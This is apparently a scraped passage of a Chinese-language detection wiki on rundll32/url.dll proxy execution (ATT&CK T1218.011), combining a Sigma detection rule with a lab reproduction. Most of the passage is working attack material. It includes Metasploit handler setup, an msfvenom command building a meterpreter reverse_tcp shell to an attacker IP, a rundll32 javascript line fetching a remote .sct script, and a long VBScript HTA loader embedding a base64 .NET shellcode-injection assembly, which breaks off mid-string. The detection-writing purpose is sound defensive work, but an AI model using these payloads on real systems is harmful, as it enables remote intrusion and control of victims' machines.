http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/ - https://twitter.com/Hexacorn/status/885258886428725250 - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 tags: - attack.defense_evasion - attack.execution - attack.t1218_11 logsource: category: process_creation product: windows detection: selection: CommandLine: - '*\\rundll32.exe* url.dll,*OpenURL *' - '*\\rundll32.exe* url.dll,*OpenURLA *' - '*\\rundll32.exe* url.dll,*FileProtocolHandler *' - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *' - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *' - '*\\rundll32.exe javascript:*' - '* url.dll,*OpenURL *' #\u9002\u5408\u672c\u6b21\u6848\u4f8b\u7684\u68c0\u6d4b\u7279\u5f81 - '* url.dll,*OpenURLA *' - '* url.dll,*FileProtocolHandler *' - '* zipfldr.dll,*RouteTheCall *' - '* Shell32.dll,*Control_RunDLL *' - '* javascript:*' - '*.RegisterXLL*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium \u5efa\u8bae \u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-011 https://attack.mitre.org/techniques/T1218/011/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09 http://www.safe6.cn/article/155","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355url.dll\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#t1218-011-win-urldllpayload","text":"","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355url.dll\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#attck","text":"Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_1","text":"url.dll\u662fInternet\u5feb\u6377\u58f3\u6269\u5c55\u76f8\u5173\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\u7cfb\u7edf\u6587\u4ef6\u3002 \u8bf4\u660e\uff1aurl.dll\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0curl.dll\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u4f46\u7531\u4e8e\u4e3adll\u6587\u4ef6\uff0c\u9700\u8c03\u7528rundll32.exe\u6765\u6267\u884c\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\url.dll C:\\Windows\\SysWOW64\\url.dll Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\url.dll C:\\Windows\\SysWOW64\\url.dll \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msf5 exploit(multi/handler) > back msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > exploit","title":"\u914d\u7f6eMSF"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#shellbin","text":"msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f raw > shell.bin cat shell.bin |base64 -w 0","title":"\u9776\u673a\u6267\u884cshell.bin"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#payload","text":"\u5c06\u751f\u6210\u7684payload\u590d\u5236\u5230code\u5904\u3002\u4fdd\u5b58\u4e3ashell.hta <script language=\"VBScript\"> Dim binary : binary =\"rundll32.exe\" Dim code : code =\"payload\"//payload\u63d2\u5165 Sub Debug(s) End Sub Sub SetVersion End Sub Function Base64ToStream(b) Dim enc, length, ba, transform, ms Set enc = CreateObject(\"System.Text.ASCIIEncoding\") length = enc.GetByteCount_2(b) Set transform = CreateObject(\"System.Security.Cryptography.FromBase64Transform\") Set ms = CreateObject(\"System.IO.MemoryStream\") ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b),0, length),0,((length /4)*3) ms.Position =0 Set Base64ToStream = ms End Function Sub Run Dim s, entry_class s =\"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy\" s = s &\"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph\" s = s &\"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk\" s = s &\"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD\" s = s &\"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl\" s = s &\"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU\" s = s &\"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl\" s = s &\"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90\" s = s &\"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu\" s = s &\"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH\" s = s &\"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA\" s = s &\"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw\" s = s &\"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu\" s = s &\"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA\" s = s &\"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u\" s = s &\"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5\" s = s &\"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR\" s = s &\"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA\" s = s &\"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y\" s = s &\"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh\" s = s &\"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz\" s = s &\"ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy\" s = s &\"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA\" s = s &\"AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA\" s = s &\"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA\" s = s &\"AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA\" s = s &\"AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA\" s = s &\"AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA\" s = s &\"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT\" s = s &\"MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA\" s = s &\"Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME\" s = s &\"EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK\" s = s &\"ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK\" s = s &\"EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA\" s = s &\"BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC\" s = s &\"fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP\" s = s &\"AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj\" s = s &\"fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB\" s = s &\"AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA\" s = s &\"ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF\" s = s &\"kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG\" s = s &\"AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I\" s = s &\"qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK\" s = s &\"ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB\" s = s &\"AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG\" s = s &\"AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB\" s = s &\"AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW\" s = s &\"gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD\" s = s &\"AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG\" s = s &\"ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I\" s = s &\"+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW\" s = s &\"gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA\" s = s &\"EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW\" s = s &\"IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg\" s = s &\"1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+\" s = s &\"BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA\" s = s &\"BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA\" s = s &\"AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA\" s = s &\"CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB\" s = s &\"AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG\" s = s &\"KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ\" s = s &\"ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA\" s = s &\"hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ\" s = s &\"AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA\" s = s &\"5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ\" s = s &\"AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB\" s = s &\"aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu\" s = s &\"ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA\" s = s &\"WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB\" s = s &\"AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA\" s = s &\"AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN\" s = s &\"b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S\" s = s &\"RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU\" s = s &\"RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP\" s = s &\"TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB\" s = s &\"VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF\" s = s &\"VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT\" s = s &\"X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP\" s = s &\"VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP\" s = s &\"UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ\" s = s &\"VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU\" s = s &\"WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD\" s = s &\"UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP\" s = s &\"Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J\" s = s &\"Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X\" s = s &\"SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO\" s = s &\"SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy\" s = s &\"ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs\" s = s &\"cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl\" s = s &\"cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW\" s = s &\"YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1\" s = s &\"dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh\" s = s &\"ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli\" s = s &\"dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0\" s = s &\"cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz\" s = s &\"ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5\" s = s &\"Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3\" s = s &\"WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI\" s = s &\"RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n\" s = s &\"AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD\" s = s &\"VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz\" s = s &\"SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ\" s = s &\"bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT\" s = s &\"ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt\" s = s &\"ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp\" s = s &\"bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp\" s = s &\"YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh\" s = s &\"Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU\" s = s &\"ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB\" s = s &\"ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk\" s = s &\"SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ\" s = s &\"cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5\" s = s &\"AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX\" s = s &\"AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE\" s = s &\"IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD\" s = s 